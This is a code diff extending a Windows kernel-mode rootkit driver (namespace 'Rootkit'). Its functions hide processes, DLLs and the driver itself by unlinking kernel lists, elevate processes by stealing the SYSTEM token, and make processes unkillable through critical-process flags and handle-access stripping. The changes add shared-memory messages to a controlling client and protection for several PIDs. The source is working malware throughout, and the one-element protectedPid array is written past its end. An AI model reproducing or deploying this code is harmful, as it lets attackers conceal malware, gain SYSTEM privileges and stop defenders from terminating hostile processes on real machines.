@@ -4,6 +4,9 @@
 #pragma warning(push)
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
+#define SHARED_MEM_SIZE 512
+#define EVENT_NAME L"\\BaseNamedObjects\\MySharedEvent"
+#define SECTION_NAME L"\\BaseNamedObjects\\MySharedSection"
 //#define DRL // Uncomment if you want to reflectively load the driver.
 #ifndef DRL
 #define DL // if DL is defined then the driver is loaded via a service, like in normal routines.
@@ -15,9 +18,17 @@ void debug_print(PCSTR text) {
 /*
 Globals
 */
+PDRIVER_OBJECT g_DriverObject;
+PDEVICE_OBJECT g_DeviceObject;
+#ifdef DL
 PVOID regHandle;
-ULONG protectedPid;
+ULONG protectedPidIndex = 0;
+ULONG protectedPid[] = { 0 };
 
+PVOID gSharedBuffer = NULL;
+PKEVENT gUserEvent = NULL;
+HANDLE gSectionHandle = NULL;
+#endif
 /*
 Functions 
 */
@@ -62,7 +73,49 @@ ULONG GetImageFileNameOffset() {
         return 0;
     }
 }
+#ifdef DL
+VOID MSGClient(const char* MSG) {
+    if (!MSG || !gSharedBuffer || !gUserEvent) {
+        debug_print("[!] Invalid parameters or uninitialized shared memory\n");
+        return;
+    }
 
+    // Get message length and validate against buffer size
+    size_t msgLen = strlen(MSG) + 1;
+    if (msgLen > SHARED_MEM_SIZE) {
+        debug_print("[!] Message too large for shared buffer\n");
+        return;
+    }
+
+    // Use try-except to handle potential memory access violations (happened to me with MEMORY_MANAGEMENT stop code..)
+    __try {
+        // Clear buffer first
+        RtlZeroMemory(gSharedBuffer, SHARED_MEM_SIZE);
+
+        // Copy message safely
+        RtlCopyMemory(gSharedBuffer, MSG, msgLen);
+
+        // Signal the event
+        KeSetEvent(gUserEvent, IO_NO_INCREMENT, FALSE);
+
+        // Wait for 1 second
+        LARGE_INTEGER interval;
+        interval.QuadPart = -10 * 1000 * 1000;
+        KeDelayExecutionThread(KernelMode, FALSE, &interval);
+
+        // Clear buffer after delay - This will be null-terminated everywhere basically.
+        RtlZeroMemory(gSharedBuffer, SHARED_MEM_SIZE);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        debug_print("[!] Exception occurred in MSGClient\n");
+    }
+}
+
+VOID MsgClientWorkerRoutine(const char* MSG) {
+    debug_print("[++] Called MSGClient.\n");
+    MSGClient(MSG);
+}
+#endif
 VOID FlinkBlinkHide(PLIST_ENTRY Current) {
     PLIST_ENTRY Prev, Next;
 
@@ -84,36 +137,72 @@ VOID FlinkBlinkHide(PLIST_ENTRY Current) {
     return;
 }
 
-NTSTATUS ProtectProcess(UINT32 PID) {
-    if (GetImageFileNameOffset() == 0) {
-        debug_print("[!-!] Build number unknown, returning from ProtectProcess.\n");
-        return STATUS_UNSUCCESSFUL;
-    }
-    NTSTATUS status = STATUS_SUCCESS;
+#ifdef DL
+VOID MsgClientWorkerRoutine(PDEVICE_OBJECT DeviceObject, PVOID Context) {  
+   UNREFERENCED_PARAMETER(DeviceObject);  
+   const char* MSG = (const char*)Context;  
+   debug_print("[++] Called MsgClientWorkerRoutine.\n");  
+   MSGClient(MSG);  
+}  
+#endif
+NTSTATUS ProtectProcess(UINT32 PID) {  
+   if (GetImageFileNameOffset() == 0) {  
+       debug_print("[!-!] Build number unknown, returning from ProtectProcess.\n");  
+       return STATUS_UNSUCCESSFUL;  
+   }
+   NTSTATUS status = STATUS_SUCCESS;  
+#ifdef DL
+   PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
+   debug_print("[+] Initiated Work-Item.\n");
+#endif
+   CLIENT_ID clientId;  
+   HANDLE hProcess;  
+   OBJECT_ATTRIBUTES objAttr;  
+   ULONG BreakOnTermination = 1;
+#ifdef DL
+   ULONG check;
+#endif
+   clientId.UniqueThread = NULL;  
+   clientId.UniqueProcess = UlongToHandle(PID);  
+   InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);  
 
-    CLIENT_ID clientId;
-    HANDLE hProcess;
-    OBJECT_ATTRIBUTES objAttr;
-    ULONG BreakOnTermination = 1;
-
-    clientId.UniqueThread = NULL;
-    clientId.UniqueProcess = UlongToHandle(PID);
-    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
-
-    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
-    if (status == STATUS_UNSUCCESSFUL) {
-        // Failure here means we will not open to modify the information of the process.
-        debug_print("[-] Failed to open process to use on ProtectProcess, returning.\n");
-        return status;
-    }
-    status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
-    if (status == STATUS_UNSUCCESSFUL) {
-        // Failure here means the process will not be marked as BreakOnTermination, which means it isn't protected.
-        debug_print("[-] Failed to set process information to use on ProtectProcess, returning.\n");
-        return status;
-    }
-    DbgPrint("[+] Process with PID: %d is now protected using BreakOnTermination flag, termination will cause a blue screen, restart computer or use the UnProtectProcess function to revert\n", PID);
-    return status;
+   status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);  
+   if (status == STATUS_UNSUCCESSFUL) {  
+       debug_print("[-] Failed to open process to use on ProtectProcess, returning.\n");  
+       return status;  
+   }
+#ifdef DL
+   status = ZwQueryInformationProcess(hProcess, ProcessBreakOnTermination, &check, sizeof(ULONG), 0);
+   if (!NT_SUCCESS(status)) {
+       debug_print("[-] Failed to query information process.. Returning.\n");
+       if (workItem) {
+           IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Failed to query information process.. Returning.");
+       }
+       else {
+           debug_print("[-] Work Item could not be initialized.\n");
+       }
+       return status;
+   }
+   if (check == 1 && workItem) {
+       IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] This process is already protected (critical).");
+       return status;
+   }
+#endif
+   status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));  
+   if (status == STATUS_UNSUCCESSFUL) {  
+       debug_print("[-] Failed to set process information to use on ProtectProcess, returning.\n");  
+       return status;  
+   }  
+   DbgPrint("[+] Process with PID: %d is now protected using BreakOnTermination flag, termination will cause a blue screen, restart computer or use the UnProtectProcess function to revert\n", PID);
+#ifdef DL
+   if (workItem) {  
+       debug_print("[+] Work Item Called!\n");  
+       IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully.");
+   } else {  
+       debug_print("[-] Work Item could not be initialized.\n");  
+   }  
+#endif
+   return status;  
 }
 
 NTSTATUS UnProtectProcess(UINT32 PID) {
@@ -122,12 +211,15 @@ NTSTATUS UnProtectProcess(UINT32 PID) {
         return STATUS_UNSUCCESSFUL;
     }
     NTSTATUS status = STATUS_SUCCESS;
-
     CLIENT_ID clientId;
     HANDLE hProcess;
     OBJECT_ATTRIBUTES objAttr;
     ULONG BreakOnTermination = 0; // Now it's 0 because we want to revert changes.
-
+#ifdef DL
+    ULONG check;
+    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
+    debug_print("[+] Initiated Work-Item.\n");
+#endif
     clientId.UniqueThread = NULL;
     clientId.UniqueProcess = UlongToHandle(PID);
     InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
@@ -138,6 +230,12 @@ NTSTATUS UnProtectProcess(UINT32 PID) {
         debug_print("[-] Failed to open process to use on UnProtectProcess, returning.\n");
         return status;
     }
+#ifdef DL
+    status = ZwQueryInformationProcess(hProcess, ProcessBreakOnTermination, &check, sizeof(ULONG), 0);
+    if (check == 0 && workItem) {
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Process wasn't protected (marked as critical), nothing changed.");
+    }
+#endif
     status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
     if (status == STATUS_UNSUCCESSFUL) {
         // Failure here means the process will stay protected, mitigating the function.
@@ -145,6 +243,11 @@ NTSTATUS UnProtectProcess(UINT32 PID) {
         return status;
     }
     DbgPrint("[+] Process with PID: %d is no longer protected, termination will not result a blue screen.\n", PID);
+#ifdef DL
+    if (workItem) {
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been unprotected successfully.");
+    }
+#endif
     return status;
 }
 
@@ -163,6 +266,10 @@ VOID HideDLL(UINT32 PID, const WCHAR* DLLName) {
         debug_print("[!-!] Aborting HideDLL function, unknown build.");
         return;
     }
+#ifdef DL
+    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
+    debug_print("[+] Initiated Work-Item.\n");
+#endif
     // Check if the DLLName address is valid, to avoid bsods.
     if (!DLLName || !MmIsAddressValid((PVOID)DLLName)) {
         debug_print("[!] Invalid DLL name pointer\n");
@@ -261,6 +368,9 @@ VOID HideDLL(UINT32 PID, const WCHAR* DLLName) {
         RtlZeroMemory(entry->FullDllName.Buffer, sizeof(entry->FullDllName.Buffer));
         RtlZeroMemory(entry->BaseDllName.Buffer, sizeof(entry->BaseDllName.Buffer));
         debug_print("[+] Successfully hidden the DLL from the process!\n");
+#ifdef DL
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Successfully hidden the DLL from the process!.");
+#endif
     }
     else {
         debug_print("[-] Status is not STATUS_SUCCESS in HideDLL function.\n");
@@ -273,6 +383,9 @@ VOID HideDLL(UINT32 PID, const WCHAR* DLLName) {
             WCHAR dllnameinloop[256];
             wcsncpy_s(dllnameinloop, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(wchar_t) - 4);
             DbgPrint("DEBUG: FullDllName.buffer INLOOP: %ws", dllnameinloop);
+#ifdef DL
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Could not hide the DLL from the process.");
+#endif
         }
     }
     // Detach from the process's memory.
@@ -287,6 +400,10 @@ VOID HideProcess(UINT32 PID) {
         debug_print("[!-!] Aborting HideProcess, unknown build.");
         return;
     }
+#ifdef DL
+    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
+    debug_print("[+] Initiated Work-Item.\n");
+#endif
     debug_print("[+] HideProcess function called.\n");
     // Assume ACTIVE_PROCESS_LINKS_OFFSET is the offset to the process ID within the EPROCESS struct.
     // Here, PID_OFFSET is set to that offset.
@@ -311,6 +428,9 @@ VOID HideProcess(UINT32 PID) {
         // If the current process PID is the one we want to hide, the hide it by unlinking it from its list entry.
         FlinkBlinkHide(CurrentList);
         debug_print("[+] Process is now hidden.\n");
+#ifdef DL
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been hidden successfully.");
+#endif
         return;
     }
     // Otherwise, we set a starting point to start looping.
@@ -331,6 +451,9 @@ VOID HideProcess(UINT32 PID) {
         if (*(UINT32*)CurrentPID == PID) {
             FlinkBlinkHide(CurrentList);
             debug_print("[+] Process is now hidden.\n");
+#ifdef DL
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been hidden successfully.");
+#endif
             return;
         }
 
@@ -349,6 +472,10 @@ NTSTATUS ElevateProcess(UINT32 PID) {
         debug_print("[!-!] Aborting ElevateProcess, unknown build.");
         return STATUS_UNSUCCESSFUL;
     }
+#ifdef DL
+    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
+    debug_print("[+] Initiated Work-Item.\n");
+#endif
     DbgPrint("[+] Starting to elevate process %u.\n", PID);
     NTSTATUS status = STATUS_SUCCESS;
     PEPROCESS pTargetProcess, pSystemProcess;
@@ -383,10 +510,16 @@ NTSTATUS ElevateProcess(UINT32 PID) {
         debug_print("--------------------------------------------------------\n");
         debug_print("[+] Successfully elevated process using SYSTEM token.\n");
         debug_print("--------------------------------------------------------\n");
+#ifdef DL
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been elevated successfully.");
+#endif
         return STATUS_SUCCESS;
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         debug_print("[!] Exception occured during token stealing.\n");
+#ifdef DL
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Error occured during process elevation.");
+#endif
         status = GetExceptionCode();
     }
 
@@ -401,6 +534,10 @@ KSPIN_LOCK g_Lock;
 KIRQL g_OldIrql;
 
 void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
+#ifdef DL
+    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
+    debug_print("[+] Initiated Work-Item.\n");
+#endif
     KIRQL oldIrql;
 
     // Raise IRQL to prevent race conditions
@@ -431,14 +568,20 @@ void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
         KeMemoryBarrier();
 
         debug_print("[+] Driver is now hidden.\n");
+#ifdef DL
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Driver has been hidden successfully.");
+#endif
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         debug_print("[!] Exception while hiding driver.\n");
+#ifdef DL
+        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Error occured during driver hiding.");
+#endif
     }
 
     // Release the spinlock
     KeReleaseSpinLock(&g_Lock, oldIrql);
-    debug_print("[+] Driver is now hidden, spinlock released.\n");
+    debug_print("[+] Releasing spinlock in HideDriver function.\n");
 }
 
 
@@ -461,8 +604,12 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG UnProtectProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+#ifdef DL
         constexpr ULONG ProtectProcessOP =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG UnProtectProcessOP =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+#endif
     }
     struct Request {
         HANDLE process_id;
@@ -515,6 +662,10 @@ namespace Rootkit {
         // finally handle the control code sent
         const ULONG control_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
         HANDLE pid = request->process_id;
+#ifdef DL
+        PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
+        debug_print("[+] Initiated Work-Item.\n");
+#endif
         WCHAR* DLLName = request->DLLName;
         switch (control_code) {
         case codes::HideDriver:
@@ -540,12 +691,41 @@ namespace Rootkit {
         case codes::HideDLL:
             HideDLL(HandleToUlong(pid), DLLName);
             break;
+#ifdef DL
         case codes::UnProtectProcess:
             UnProtectProcess(HandleToUlong(pid));
             break;
         case codes::ProtectProcessOP:
-            protectedPid = HandleToUlong(pid);
+            protectedPid[protectedPidIndex++] = HandleToUlong(pid);
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully. (ACCESS_DENIED Protection)");
             break;
+        case codes::UnProtectProcessOP:
+        {
+            BOOLEAN found = FALSE;
+            for (ULONG i = 0; i < protectedPidIndex; i++) {
+                if (protectedPid[i] == HandleToUlong(pid)) {
+                    // Shift remaining elements left
+                    for (ULONG j = i; j < protectedPidIndex - 1; j++) {
+                        protectedPid[j] = protectedPid[j + 1];
+                    }
+                    protectedPidIndex--; // Decrease the count
+                    found = TRUE;
+                    break; // Exit after removing one instance
+                }
+            }
+
+            // Queue work item only if we actually unprotected a process
+            if (found) {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue,
+                    (PVOID)"[+] Process has been unprotected successfully. (ACCESS_DENIED Protection)");
+            }
+            else {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue,
+                    (PVOID)"[-] Process was not found in protected list.");
+            }
+            break;
+        }
+#endif
         default:
             // something is horribly wrong
             debug_print("[!] Unknown control code received!");
@@ -572,6 +752,21 @@ VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
     ObUnRegisterCallbacks(regHandle);
 #endif
 
+#ifdef DL
+    if (gUserEvent) {
+        ObDereferenceObject(gUserEvent);
+        gUserEvent = NULL;
+    }
+    if (gSharedBuffer) {
+        ZwUnmapViewOfSection(ZwCurrentProcess(), gSharedBuffer);
+        gSharedBuffer = NULL;
+    }
+    if (gSectionHandle) {
+        ZwClose(gSectionHandle);
+        gSectionHandle = NULL;
+    }
+#endif
+
     // Delete device object(s)
     PDEVICE_OBJECT device_object = DriverObject->DeviceObject;
     while (device_object) {
@@ -579,31 +774,38 @@ VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
         IoDeleteDevice(device_object);
         device_object = next_device;
     }
+#ifdef DL
+    g_DeviceObject = NULL;
+    g_DriverObject = NULL;
+#endif
     debug_print("[+] Device object(s) deleted.\n");
 }
 
+#ifdef DL
 // Register the pre open process operation callback - which means that everytime a process is opened (handled), it will first come here.
 OB_PREOP_CALLBACK_STATUS PreOpenProcessOperation(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
     if (Info->KernelHandle) {
         return OB_PREOP_SUCCESS; // If it's a handle that is called by the kernel driver, we just return success. I might modify this so it also rejects, but IDK if it's possible.
     }
+    debug_print("[+] Initiated Work-Item.\n");
     // Get the process EPROCESS from the callback
     PEPROCESS process = (PEPROCESS)Info->Object;
     // Use the function to retrieve it's pid from the EPROCESS, we could also manually do this but who cares lol.
     UINT32 pid = HandleToUlong(PsGetProcessId(process));
 
     // Protecting our process by stripping PROCESS_TERMINATE from the flags.
-    if (pid == protectedPid) {
-        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE; // Do bitwise AND on the left side of the equation here, which will result on 0 on the desired access, (which is the opposite of process terminate).
-        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
-        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
-        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
-        Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
+    for (ULONG i = 0; i < protectedPidIndex; i++) {
+        if (pid == protectedPid[i]) {
+            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE; // Do bitwise AND on the left side of the equation here, which will result on 0 on the desired access, (which is the opposite of process terminate).
+            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
+            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
+            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
+            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
+        }
     }
-
     return OB_PREOP_SUCCESS;
 }
-
+#endif
 NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
     UNREFERENCED_PARAMETER(registry_path);
 
@@ -647,7 +849,7 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
     OB_CALLBACK_REGISTRATION reg = {
         OB_FLT_REGISTRATION_VERSION, // just use the current version
         1, // 1 is the amount of registrations we did, so far its 1.
-        RTL_CONSTANT_STRING(L"11222.5261"), // unique code for our registration driver
+        RTL_CONSTANT_STRING(L"11222.5261"), // unique code for our registration driver - lower better (below 20k loads first)
         nullptr, // registration context is null for now
         operations // our operations we want to callback
     };
@@ -664,6 +866,62 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
     debug_print("[+] Callbacks registered successfully\n");
 #endif
 
+// Shared Memory setup.
+#ifdef DL
+    // Properties init.
+    UNICODE_STRING sectionName = RTL_CONSTANT_STRING(SECTION_NAME);
+    OBJECT_ATTRIBUTES secAttr;
+    InitializeObjectAttributes(&secAttr, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
+    // Max size of memory section
+    LARGE_INTEGER maxSize;
+    maxSize.QuadPart = SHARED_MEM_SIZE;
+    
+    // Setup shared memory section.
+    status = ZwCreateSection(&gSectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE, &secAttr, &maxSize, PAGE_READWRITE, SEC_COMMIT, NULL);
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("[-] Failed to setup ZwCreateSection, status code: %08X\n", status);
+        return status;
+    }
+    SIZE_T viewSize = SHARED_MEM_SIZE;
+    status = ZwMapViewOfSection(gSectionHandle, ZwCurrentProcess(), &gSharedBuffer, 0, SHARED_MEM_SIZE, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("[-] Failed to setup ZwMapViewOfSection, status code: %08X\n", status);
+        return status;
+    }
+    // Setup event to notify client.
+    UNICODE_STRING eventName = RTL_CONSTANT_STRING(EVENT_NAME);
+    OBJECT_ATTRIBUTES evtAttr;
+    InitializeObjectAttributes(&evtAttr, &eventName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
+
+    // Create the event
+    HANDLE hUserEvent = NULL;
+    status = ZwCreateEvent(&hUserEvent,
+        EVENT_ALL_ACCESS,
+        &evtAttr,
+        NotificationEvent,  // Manual reset event
+        FALSE);            // Initial state is non-signaled
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("[-] Failed to create event, status code: %08X\n", status);
+        return status;
+    }
+
+    // Convert the handle to PKEVENT for kernel use
+    status = ObReferenceObjectByHandle(hUserEvent,
+        EVENT_ALL_ACCESS,
+        *ExEventObjectType,
+        KernelMode,
+        (PVOID*)&gUserEvent,
+        NULL);
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("[-] Failed to reference event object, status code: %08X\n", status);
+        ZwClose(hUserEvent);
+        return status;
+    }
+
+    // We can close the handle now since we have the PKEVENT
+    ZwClose(hUserEvent);
+    debug_print("[+] Event created successfully\n");
+#endif
     // Setup IOCTL Comm.
     // Allow us to send small amounts of data between user-mode/kernel-mode
     SetFlag(device_object->Flags, DO_BUFFERED_IO);
@@ -677,6 +935,8 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
 
 #ifdef DL
     driver_object->DriverUnload = UnloadDriver;
+    g_DriverObject = driver_object;
+    g_DeviceObject = device_object;
 #endif
     debug_print("[+] Device initialized successfully.\n");
 
@@ -695,7 +955,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 #ifdef DRL
     UNREFERENCED_PARAMETER(DriverObject);
     UNREFERENCED_PARAMETER(RegistryPath);
-    debug_print("Driver is reflectively loaded\n");
+    debug_print("[!] Driver is reflectively loaded\n");
     return IoCreateDriver(&driver_name, &DriverMain);
 #else
     return DriverMain(DriverObject, RegistryPath);
